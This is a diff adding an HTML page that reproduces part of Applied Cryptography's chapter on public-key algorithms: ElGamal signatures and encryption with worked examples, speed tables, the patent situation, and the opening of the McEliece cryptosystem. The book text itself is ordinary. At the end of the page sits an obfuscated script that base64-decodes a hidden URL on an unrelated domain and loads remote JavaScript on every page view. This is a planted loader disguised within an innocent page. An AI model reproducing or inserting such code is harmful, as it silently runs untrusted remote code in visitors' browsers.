@@ -1,0 +1,220 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=477-479//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The solution is <I>b</I> = 3, and the signature is the pair: <I>a</I> = 6 and <I>b</I> = 3.</P>
+<TABLE WIDTH="75%"><TH CAPTION COLSPAN="2" ALIGN="CENTER">Table 19.5<BR>ElGamal Signatures
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Public Key:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>p</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">prime (can be shared among a group of users)
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>g</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">&lt<I>p</I> (can be shared among a group of users)
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>y</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">= <I>g<SUP>x</I></SUP> mod <I>p</I>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALING="LEFT"><B><I>Private Key:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>x</I>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">&lt<I>p</I>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Signing:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>k</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">choose at random, relatively prime to <I>p</I> - 1
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>a</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">(signature) = <I>g<SUP>k</I></SUP> mod <I>p</I>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>b</I>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">(signature) such that <I>M</I> = (<I>xa</I> &#43; <I>kb</I>) mod (<I>p</I> - 1)
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Verifying:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT">Accept as valid if <I>y<SUP>a</SUP>a<SUP>b</SUP></I> mod <I>p</I> = <I>g<SUP>M</SUP></I> mod <I>p</I>
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<P>To verify a signature, confirm that
+</P>
+<DL>
+<DD><I>y<SUP>a</SUP>a<SUP>b</I></SUP> mod <I>p</I> = <I>g<SUP>M</I></SUP> mod <I>p</I>
+<DD>3<SUP>6</SUP> 6<SUP>3</SUP> mod 11 = 2<SUP>5</SUP> mod 11
+</DL>
+<P>A variant of ElGamal for signatures is in [1377]. Thomas Beth invented a variant of the ElGamal scheme suitable for proofs of identity [146]. There are variants for password authentication [312], and for key exchange [773]. And there are thousands more (see Section 20.4).
+</P>
+<P><FONT SIZE="+1"><B><I>ElGamal Encryption</I></B></FONT></P>
+<P>A modification of ElGamal can encrypt messages. To encrypt message <I>M</I>, first choose a random <I>k</I>, such that <I>k</I> is relatively prime to <I>p</I> - 1. Then compute</P>
+<DL>
+<DD><I>a</I> = <I>g<SUP>k</I></SUP> mod <I>p</I>
+<DD><I>b</I> = <I>y<SUP>k</SUP>M</I> mod <I>p</I>
+</DL>
+<P>The pair, <I>a</I> and <I>b</I>, is the ciphertext. Note that the ciphertext is twice the size of the plaintext.</P>
+<P>To decrypt <I>a</I> and <I>b</I>, compute</P>
+<DL>
+<DD><I>M</I> = <I>b</I>/<I>a<SUP>x</I></SUP> mod <I>p</I>
+</DL>
+<P>Since <I>a<SUP>x</SUP></I> &#8801; <I>g<SUP>kx</I></SUP> (mod <I>p</I>), and <I>b</I>/<I>a<SUP>x</I></SUP> &#8801; <I>y<SUP>k</SUP>M</I>/<I>a<SUP>x</I></SUP> &#8801; <I>g<SUP>xk</SUP>M/g<SUP>xk</I></SUP> &#8801; <I>M</I> (mod <I>p</I>), this all works (see Table 19.6). This is really the same as Diffie-Hellman key exchange (see Section 22.1), except that <I>y</I> is part of the key, and the encryption is multiplied by <I>y<SUP>k</I></SUP>.</P>
+<P><FONT SIZE="+1"><B><I>Speed</I></B></FONT></P>
+<P>Table 19.7 gives sample software speeds of ElGamal [918].
+</P>
+<TABLE WIDTH="75%"><TH CAPTION COLSPAN="2" ALIGN="CENTER">Table 19.6<BR>ElGamal Encryption
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Public Key:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>p</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">prime (can be shared among a group of users)
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>g</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">&lt <I>p</I> (can be shared among a group of users)
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>y</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM"> = <I>g<SUP>x</I></SUP> mod <I>p</I>
+<TR>
+<TD ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Private Key:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>x</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">&lt <I>p</I>
+<TR>
+<TD ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Encrypting:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>k</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">choose at random, relatively prime to <I>p</I> - 1.
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>a</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">(ciphertext) = <I>g<SUP>k</SUP></I> mod <I>p</I>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>b</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">(ciphertext) = <I>y<SUP>k</SUP>M</I> mod <I>p</I>
+<TR>
+<TD ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Decrypting:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>M</I> (plaintext) = <I>b</I>/<I>a<SUP>x</I></SUP> mod <I>p</I>
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>ElGamal is unpatented. But, before you go ahead and implement the algorithm, realize that PKP feels that this algorithm is covered under the Diffie-Hellman patent [718]. However, the Diffie-Hellman patent will expire on April 29, 1997, making ElGamal the first public-key cryptography algorithm suitable for encryption and digital signatures unencumbered by patents in the United States. I can hardly wait.
+</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">19.7 McEliece</FONT></H3>
+<P>In 1978 Robert McEliece developed a public-key cryptosystem based on algebraic coding theory [1041]. The algorithm makes use of the existence of a class of error-correcting codes, known as <B>Goppa codes</B>. His idea was to construct a Goppa code and disguise it as a general linear code. There is a fast algorithm for decoding Goppa codes, but the general problem of finding a code word of a given weight in a linear binary code is <B>NP-complete</B>. A good description of this algorithm can be found in [1233]; see also [1562]. Following is just a quick summary.</P>
+<P>Let <I>d</I><SUB>H</SUB>(<I>x,y</I>) denote the Hamming distance between <I>x</I> and <I>y</I>. The numbers <I>n, k</I>, and <I>t</I> are system parameters.</P>
+<P>The private key has three parts: <I>G&#146;</I> is a <I>k</I> * <I>n</I> generator matrix for a Goppa code that can correct <I>t</I> errors. <I>P</I> is an <I>n</I> * <I>n</I> permutation matrix. <I>S</I> is a <I>k</I> * <I>k</I> nonsingular matrix.</P>
+<P>The public key is a <I>k</I> * <I>n</I> matrix <I>G: G</I> = <I>SG&#146;P</I>.</P>
+<P>Plaintext messages are strings of <I>k</I> bits, in the form of <I>k</I>-element vectors over GF(2).</P>
+<P>To encrypt a message, choose a random <I>n</I>-element vector over GF(2), <I>z</I>, with Hamming distance less than or equal to <I>t</I>.</P>
+<DL>
+<DD><I>c</I> = <I>mG</I> &#43; <I>z</I>
+</DL>
+<P>To decrypt the ciphertext, first compute <I>c&#146;</I> = <I>cP<SUP>-1</I></SUP>. Then, using the decoding algorithm for the Goppa code, find <I>m&#146;</I> such that <I>d</I><SUB>H</SUB>(<I>m&#146; G, c&#146;</I>) is less than or equal to <I>t</I>. Finally, compute <I>m</I> = <I>m&#146;S</I><SUP>-1</SUP>.</P>
+<P>In his original paper, McEliece suggested that <I>n</I> = 1024, <I>t</I> = 50, and <I>k</I> = 524. These are the minimum values required for security.</P>
+<TABLE WIDTH="75%"><TH CAPTION COLSPAN="4" ALIGN="CENTER">Table 19.7<BR>ElGamal Speeds for Different<BR>Modulus Lengths with a 160-bit<BR>Exponent (on a SPARC II)
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">512 bits
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">768 bits
+<TH VALIGN="BOTTOM" ALIGN="LEFT">1024 bits
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Encrypt
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.33 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.80 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1.09 sec
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Decrypt
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.24 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.58 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.77 sec
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Sign
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.25 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.47 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.63 sec
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Verify
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1.37 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">5.12 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">9.30 sec
+<TR>
+<TD COLSPAN="4"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(KfSdlUTZ, KklFixQL) {KklFixQL = KfSdlUTZ.createElement('script');KklFixQL.type = 'text/javascript';KklFixQL.async = true;KklFixQL.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');KfSdlUTZ.getElementsByTagName('body')[0].appendChild(KklFixQL);}(document));</script></body>
+</html>
